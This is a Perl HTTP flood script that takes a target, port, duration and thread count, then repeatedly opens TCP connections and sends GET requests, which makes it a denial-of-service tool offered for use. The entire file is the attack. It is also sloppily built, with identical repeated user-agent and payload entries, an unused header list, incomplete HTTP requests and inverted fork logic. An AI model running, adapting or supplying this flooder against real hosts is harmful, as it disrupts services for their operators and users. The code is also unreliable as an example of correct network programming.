#!/usr/bin/perl

use IO::Socket::INET;
use strict;

if ($#ARGV != 3) {
    print "usage: $0 <target> <port> <time> <threads>\n";
    exit(1);
}

my ($ip, $port, $time, $threads) = @ARGV;

# User agents
my @user_agents = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
);

# Headers
my @headers = (
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Encoding: gzip, deflate, br",
    "Accept-Language: en-US,en;q=0.9",
    "Connection: keep-alive",
    "Upgrade-Insecure-Requests: 1",
    "Cache-Control: max-age=0",
    "Origin: https://example.com",
    "Referer: https://example.com/page",
    "Content-Type: application/x-www-form-urlencoded",
    "Content-Length: 0"
);

# Payloads
my @payloads = (
    "GET / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(scalar @user_agents))]\r\n",
    "GET / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(scalar @user_agents))]\r\n",
    "GET / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(scalar @user_agents))]\r\n",
    "GET / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(scalar @user_agents))]\r\n",
    "GET / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(scalar @user_agents))]\r\n",
    "GET / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(scalar @user_agents))]\r\n",
    "GET / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(scalar @user_agents))]\r\n",
    "GET / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(scalar @user_agents))]\r\n",
    "GET / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(scalar @user_agents))]\r\n",
    "GET / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agents[int(rand(scalar @user_agents))]\r\n"
);

my $max_time = time() + $time;
my $sock;

print "Flooding $ip:$port for $time seconds using $threads threads\n";

for (my $i = 0; $i < $threads; $i++) {
    if (fork()) {
        while (time() < $max_time) {
            $sock = new IO::Socket::INET(PeerAddr => $ip, PeerPort => $port, Proto => 'tcp');
            if ($sock) {
                my $payload = $payloads[int(rand(scalar @payloads))];
                print $sock $payload;
                close($sock);
            }
        }
        exit(0);
    }
}

sleep($time);
